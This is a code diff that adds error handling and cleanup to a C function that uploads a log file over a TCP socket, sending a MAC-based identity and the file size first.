@@ -10,7 +10,7 @@ int sendLogs();
 
 
 int sendLogs(char *filepath, char *mac) {
-	int sockfd = 0;
+	int sockfd;
 	char identity[18];
 	char recvBuff[1024];
 	memset(recvBuff,'\0',1024);
@@ -21,7 +21,7 @@ int sendLogs(char *filepath, char *mac) {
 	// Create the socket
 	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         perror("[-]Could not create socket.\n");
-        return 1;
+        return -1;
     }
 
     // Generate the socket information
@@ -32,11 +32,14 @@ int sendLogs(char *filepath, char *mac) {
 
 	if (connect(sockfd, (struct sockaddr *)&to , sizeof(to)) < 0){
 		perror("[-]Could not connect to the server.\n");
-        return 1;
+        return -1;
 	}
 
 	// # Phase 1 : Probe send our identity to the server
-	write(sockfd, identity, sizeof(identity)); 
+	if(write(sockfd, identity, sizeof(identity)) < 0) {
+		perror("[-] Error sending identity");
+		return -1;
+	}
 	// Wait ack from the server
 	read(sockfd, recvBuff, 1);
 
@@ -48,14 +51,22 @@ int sendLogs(char *filepath, char *mac) {
 	printf("SIZE: %d\n", logsize);
 
 	// Send data size
-	write(sockfd, &logsize, 4);
+	if(write(sockfd, &logsize, 4) < 0) {
+		perror("[-] Error sending size");
+		return -1;
+	}
 	read(sockfd, recvBuff, 1);
 
 	int logread = 0;
 	while( (logread=read(fd, recvBuff, 56)) > 0 ) {
 		// Send encrypted data
-		write(sockfd, recvBuff, logread);
+		if(write(sockfd, recvBuff, logread) < 0) {
+			perror("[-] Error during send phase");
+			return -1;
+		}
 	}
-  	
+	printf(">>OK\n");
+  	close(fd);
 	close(sockfd);
+	return 0;
 }
